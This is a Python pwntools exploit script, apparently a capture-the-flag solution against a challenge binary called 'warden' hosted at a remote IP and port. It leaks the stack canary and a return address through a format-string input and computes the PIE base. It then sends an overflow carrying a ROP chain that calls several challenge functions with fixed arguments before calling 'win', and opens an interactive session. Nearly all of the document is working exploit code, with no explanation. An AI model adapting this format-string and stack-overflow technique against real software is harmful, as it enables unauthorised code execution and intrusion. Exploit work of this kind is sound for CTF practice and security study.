from pwn import *


context.binary = binary = ELF('./warden', checksec=False)
context.log_level = 'info'

#p = process('./warden')
p = remote('14.225.212.104', 9004)

# --- LEAK ---
p.recvuntil(b"breached.\n")
p.sendline(b'%15$p|%19$p') 

raw_output = p.recvline() 

clean_output = raw_output.split(b'Pow')[0].strip()
leak_data = clean_output.split(b'|')

canary = int(leak_data[0], 16)
leak_main_ret = int(leak_data[1], 16)

log.success(f"Canary: {hex(canary)}")
log.success(f"Leak Ret: {hex(leak_main_ret)}")

offset_ret_main = 0x14fd 
binary.address = leak_main_ret - offset_ret_main
log.success(f"PIE Base: {hex(binary.address)}")

rop = ROP(binary)
pop_ret = rop.find_gadget(['pop ebx', 'ret'])[0]

payload = flat(
    binary.symbols['braum'],
    pop_ret,
    4919,

    binary.symbols['ornn'],
    pop_ret,
    1056,
    
    binary.symbols['thress'],
    pop_ret,
    0xdeadbeef,
    
    binary.symbols['win'],
    0x0,      
    291       
)

final_payload = b'A' * 32 + p32(canary) + b'B' * 12 + payload

log.info("Sending payload...")
p.sendline(final_payload)

p.interactive()